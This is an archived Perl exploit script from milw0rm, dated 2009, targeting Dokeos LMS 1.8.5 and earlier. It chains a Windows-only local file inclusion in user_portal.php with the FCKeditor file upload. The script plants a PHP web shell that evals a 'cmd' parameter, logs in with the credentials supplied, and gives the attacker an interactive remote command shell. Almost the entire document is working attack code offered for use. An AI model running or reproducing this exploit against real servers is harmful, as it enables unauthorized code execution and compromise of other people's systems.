<html><head><title>Dokeos LMS <= 1.8.5 (include) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
#
# Dokeos LMS &lt;= 1.8.5 &quot;include&quot; Remote Code Execution Exploit
# 
# Description
# ---------------------------------------------------------------
# Dokeos LMS contains one flaw that allows an attacker to include
# a local file with &quot;html&quot; extension. 
# The issue is due to 'user_portal.php' script not properly
# sanitizing user input supplied to the 'include' GET variable.
# ---------------------------------------------------------------
# Code Details (user_portal.php Line 770 - 774)
# ---------------------------------------------------------------
# if (!empty ($_GET['include']) &amp;&amp; !strstr($_GET['include'], '/') 
# &amp;&amp; strstr($_GET['include'], '.html'))
# 
# {
#       include ('./home/'.$_GET['include']);
#	$pageIncluded = true;
#  }
# ---------------------------------------------------------------
# As you can see,it's possible to include files with &quot;html&quot; ext
# and &quot;/&quot; isn't allowed,seems be a valid fix.It's useless on win
# because you can use &quot;\&quot; to change directory.
# This LFI is useful because in Dokeos LMS fckeditor exists in
# /main/inc/lib/fckeditor/editor/filemanager/upload/php/upload.php
# you can upload a file with &quot;.html&quot; extension. You'll have a rce
# 
# Example: user_portal.php?include=..\main\upload\[FILE].html
# it works regardless of php.ini settings on windows system only
# ---------------------------------------------------------------
# Thanks to Aquilo of http://zeroidentity.org - and #zeroidentity
# ---------------------------------------------------------------
# http://www.youtube.com/watch?v=JxZcFArCeKs english 
# http://www.youtube.com/watch?v=txY52DTtFhQ italian
# ---------------------------------------------------------------
# by Juri Gianni aka yeat - staker[at]hotmail[dot]it
# ---------------------------------------------------------------

use IO::Socket;
use LWP::UserAgent;
use HTTP::Cookies;


my ($host,$path,$user,$pass) = @ARGV;

if (@ARGV &lt; 4) {
      print &quot;Dokeos LMS &lt;= 1.8.5 Remote Code Execution Exploit\n&quot;;
      x__usage();
}
      

do_exploit();
                               

sub shell_up()
{ 
       my ($data,$packet,$result);
       
       my $vector = chr(45) x27;
       my $socket = new IO::Socket::INET(
                                          PeerAddr =&gt; $host,
                                          PeerPort =&gt; 80,
                                          Proto    =&gt; 'tcp',
                                        ) or die $!;
        
       
       $data .= $vector.&quot;--uploading\r\n&quot;;
       $data .= &quot;Content-Disposition: form-data; name=\&quot;NewFile\&quot;; filename=\&quot;yeat.html\&quot;\r\n&quot;;
       $data .= &quot;Content-Type: unknown/unknown\r\n\r\n&quot;;
       $data .= &quot;&lt;?php error_reporting(E_ALL); if(isset(\$_GET['cmd'])){die(eval(stripslashes(\$_GET['cmd'])));} ?&gt;\r\n&quot;;
       $data .= $vector.&quot;--uploading--\r\n&quot;;

       $packet .= &quot;POST $path/main/inc/lib/fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.0\r\n&quot;;
       $packet .= &quot;Content-Type: multipart/form-data; boundary=&quot;.$vector.&quot;uploading\r\n&quot;;
       $packet .= &quot;Host: $host\r\n&quot;;
       $packet .= &quot;User-Agent :Lynx (textmode)\r\n&quot;;
       $packet .= &quot;Content-Length: &quot;.length($data).&quot;\r\n&quot;;
       $packet .= &quot;Connection: Close\r\n\r\n&quot;;
       $packet .= $data;

       $socket-&gt;send($packet);

       foreach $result (&lt;$socket&gt;) { 
             
             if ($result =~ /OnUploadCompleted\(0,&quot;(.+?)&quot;/i) {
                   return $1;
             }
       }                
}


sub do_exploit()
{
       my ($_riot,$shell,$cmd,$login);
       
       my $cookie = new HTTP::Cookies  || die $!;
       my $sock_u = new LWP::UserAgent || die $!;
       
       $sock_u-&gt;cookie_jar($cookie);                             
       $sock_u-&gt;agent('Lynx (textmode)');
       $sock_u-&gt;timeout(5);
       
       $_riot = shell_up() =~ /upload\/(.*)/i ? $1 : 0;
           
       $login = $sock_u-&gt;post(&quot;http://$host/$path/index.php&quot;,
                           [ 
                             login =&gt; $user,
                             password =&gt; $pass,
                             submitAuth =&gt; 'Confirm',
                           ]) || die $!;
       
       unless ($login-&gt;content =~ /class=&quot;logout&quot;/i) {
          die(&quot;Login failed..\n&quot;);
       }   
                           
      
       while (1) {
             print &quot;\nyeat[shell]:~\$ &quot;;
          
             chomp($cmd = &lt;STDIN&gt;);
          
             if ($cmd !~ /^exit+$/i) {
                   $shell = $sock_u-&gt;get(&quot;http://$host/$path/user_portal.php?include=..\\main\\upload\\$_riot&amp;cmd=$cmd&quot;);
                  
                   if ($shell-&gt;content =~ /&lt;div class=&quot;maincontent&quot;&gt;(.*)/i) {
                         print $1;
                   }  
                   else {
                         print &quot;No output here..\n&quot;;
                   }           
             }
             else {
                die(&quot;Exited successful..\n&quot;);
             }         
      }
}
      

sub x__usage()
{
       print &quot;Usage: perl xpl.pl host /path/ username password\n&quot;;
       print &quot;RunEx: perl localhost /dokeos/ yeat anarchy\n&quot;;
       exit;
}       

# milw0rm.com [2009-04-22]</pre></html>